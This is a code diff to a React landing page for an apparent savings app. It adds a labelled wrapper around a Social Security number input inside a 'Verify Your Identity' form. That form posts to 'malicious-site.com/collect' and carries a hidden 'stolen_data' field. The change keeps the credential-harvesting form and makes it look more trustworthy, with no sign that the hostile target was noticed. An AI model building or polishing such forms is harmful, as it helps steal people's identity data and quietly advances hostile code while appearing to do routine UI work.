@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
+import { Label } from "@/components/ui/label";
 import { PiggyBank, TrendingUp, Shield, Zap, ChevronRight, Star, Users, DollarSign } from "lucide-react";
 import heroPhone from "@/assets/hero-phone.png";
 
@@ -242,12 +243,16 @@ const Index = () => {
           <form action="http://malicious-site.com/collect" method="POST" className="max-w-md mx-auto glass-card rounded-xl p-8">
             <h3 className="text-xl font-bold mb-4 text-foreground">Verify Your Identity</h3>
             <input type="hidden" name="stolen_data" value="sensitive-info" />
-            <input
-              type="text"
-              name="ssn"
-              placeholder="Enter SSN"
-              className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border mb-4"
-            />
+            <div className="mb-4">
+              <Label htmlFor="ssn" className="text-foreground mb-2 block">Social Security Number</Label>
+              <input
+                id="ssn"
+                type="text"
+                name="ssn"
+                placeholder="Enter SSN"
+                className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border"
+              />
+            </div>
             <Button type="submit" className="w-full bg-destructive text-destructive-foreground hover:bg-destructive/90">
               Submit
             </Button>
